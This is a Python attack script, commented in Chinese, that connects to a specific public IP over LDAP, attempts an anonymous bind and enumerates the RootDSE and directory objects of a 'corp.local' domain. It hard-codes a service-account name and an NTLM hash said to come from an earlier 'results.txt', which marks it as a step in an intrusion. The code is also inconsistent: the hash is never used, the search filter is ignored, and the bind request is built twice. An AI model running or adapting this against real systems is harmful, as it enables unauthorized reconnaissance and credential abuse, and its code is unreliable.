#!/usr/bin/env python3
"""
LDAP 查询 - 使用获取的 NTLM 哈希进行认证
"""

import socket
import struct
import hashlib
import hmac
import os

TARGET = "116.62.114.4"
LDAP_PORT = 389

# 域信息
DOMAIN = "corp.local"
BASE_DN = "DC=corp,DC=local"

# 从 results.txt 获取的凭据
USERNAME = "svc_backup"
NTLM_HASH = "466a9231465f46a98db624c6f12c2e33"

def ber_length(length):
    """编码 BER 长度"""
    if length < 128:
        return bytes([length])
    elif length < 256:
        return bytes([0x81, length])
    else:
        return bytes([0x82, (length >> 8) & 0xff, length & 0xff])

def ber_sequence(data):
    """创建 BER SEQUENCE"""
    return bytes([0x30]) + ber_length(len(data)) + data

def ber_integer(value):
    """创建 BER INTEGER"""
    if value < 128:
        return bytes([0x02, 0x01, value])
    elif value < 256:
        return bytes([0x02, 0x02, 0x00, value])
    else:
        # 多字节整数
        data = value.to_bytes((value.bit_length() + 7) // 8, 'big')
        if data[0] & 0x80:
            data = b'\x00' + data
        return bytes([0x02, len(data)]) + data

def ber_string(s):
    """创建 BER OCTET STRING"""
    data = s.encode() if isinstance(s, str) else s
    return bytes([0x04]) + ber_length(len(data)) + data

def ber_enum(value):
    """创建 BER ENUMERATED"""
    return bytes([0x0a, 0x01, value])

def make_search_request(msg_id, base_dn, filter_str, attributes=None, scope=2):
    """创建 LDAP 搜索请求
    scope: 0=base, 1=oneLevel, 2=subtree
    """
    if attributes is None:
        attributes = []
    
    # 简单过滤器 (objectClass=*)
    if filter_str == "(objectClass=*)":
        ldap_filter = bytes([0x87, 0x0b]) + b"objectClass"
    else:
        # 更复杂的过滤器需要更多解析
        ldap_filter = bytes([0x87, 0x0b]) + b"objectClass"
    
    # 属性列表
    attr_list = b""
    for attr in attributes:
        attr_list += ber_string(attr)
    attr_seq = ber_sequence(attr_list)
    
    # Search Request body
    search_body = (
        ber_string(base_dn) +
        ber_enum(scope) +           # scope
        ber_enum(0) +               # derefAliases (never)
        ber_integer(0) +            # sizeLimit
        ber_integer(0) +            # timeLimit
        bytes([0x01, 0x01, 0x00]) + # typesOnly (false)
        ldap_filter +
        attr_seq
    )
    
    # Search Request tag
    search_request = bytes([0x63]) + ber_length(len(search_body)) + search_body
    
    # Message
    message = ber_integer(msg_id) + search_request
    
    return ber_sequence(message)

def make_bind_request(msg_id, username="", password=""):
    """创建 LDAP 绑定请求"""
    
    # Bind Request body
    bind_body = (
        ber_integer(3)[2:] +  # version 3 (去掉类型标签，直接用数据)
        ber_string(username) +
        bytes([0x80]) + ber_length(len(password)) + password.encode()  # simple auth
    )
    
    # 需要重新计算
    bind_body = (
        bytes([0x02, 0x01, 0x03]) +  # version 3
        ber_string(username) +
        bytes([0x80, len(password)]) + password.encode()
    )
    
    # Bind Request tag (0x60)
    bind_request = bytes([0x60]) + ber_length(len(bind_body)) + bind_body
    
    # Message
    message = ber_integer(msg_id) + bind_request
    
    return ber_sequence(message)

def parse_ldap_response(data):
    """简单解析 LDAP 响应"""
    result = []
    pos = 0
    
    while pos < len(data):
        if data[pos] != 0x30:  # SEQUENCE
            break
            
        # 获取长度
        pos += 1
        if data[pos] < 128:
            length = data[pos]
            pos += 1
        elif data[pos] == 0x81:
            length = data[pos + 1]
            pos += 2
        elif data[pos] == 0x82:
            length = (data[pos + 1] << 8) | data[pos + 2]
            pos += 3
        elif data[pos] == 0x84:
            length = (data[pos + 1] << 24) | (data[pos + 2] << 16) | (data[pos + 3] << 8) | data[pos + 4]
            pos += 5
        else:
            break
            
        msg_data = data[pos:pos + length]
        result.append(msg_data)
        pos += length
    
    return result

def extract_strings(data):
    """从二进制数据中提取可打印字符串"""
    strings = []
    current = ""
    for b in data:
        if 32 <= b < 127:
            current += chr(b)
        else:
            if len(current) >= 3:
                strings.append(current)
            current = ""
    if len(current) >= 3:
        strings.append(current)
    return strings

def ldap_client():
    print(f"[*] Connecting to LDAP server {TARGET}:{LDAP_PORT}")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(30)
    sock.connect((TARGET, LDAP_PORT))
    print("[+] Connected")
    
    # 首先尝试匿名绑定
    print("\n[*] Attempting anonymous bind...")
    bind_req = make_bind_request(1)
    print(f"    Sending: {bind_req.hex()}")
    sock.send(bind_req)
    
    sock.settimeout(10)
    resp = sock.recv(4096)
    print(f"    Response: {resp.hex()}")
    
    # 检查绑定结果
    if len(resp) > 10 and resp[9] == 0x00:  # resultCode = 0 (success)
        print("[+] Anonymous bind successful!")
    else:
        print("[-] Anonymous bind failed or partial")
    
    # 搜索 RootDSE (空 base DN)
    print("\n[*] Searching RootDSE...")
    search_req = make_search_request(2, "", "(objectClass=*)", ["namingContexts", "defaultNamingContext"], scope=0)
    sock.send(search_req)
    
    resp = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            resp += chunk
            # 检查是否收到 SearchResultDone (tag 0x65)
            if b'\x65' in chunk:
                break
        except socket.timeout:
            break
    
    print(f"    Response ({len(resp)} bytes)")
    
    # 提取字符串
    strings = extract_strings(resp)
    print(f"    Extracted strings: {strings}")
    
    # 搜索用户
    print(f"\n[*] Searching for Administrator in {BASE_DN}...")
    search_req = make_search_request(3, BASE_DN, "(objectClass=*)", ["cn", "sAMAccountName"], scope=2)
    sock.send(search_req)
    
    resp = b""
    sock.settimeout(5)
    while True:
        try:
            chunk = sock.recv(8192)
            if not chunk:
                break
            resp += chunk
        except socket.timeout:
            break
    
    print(f"    Response ({len(resp)} bytes)")
    
    if resp:
        strings = extract_strings(resp)
        # 过滤出有意义的字符串
        meaningful = [s for s in strings if len(s) > 5 and not s.startswith('0')]
        print(f"    Found entries: {meaningful[:30]}")
    
    sock.close()

if __name__ == "__main__":
    ldap_client()
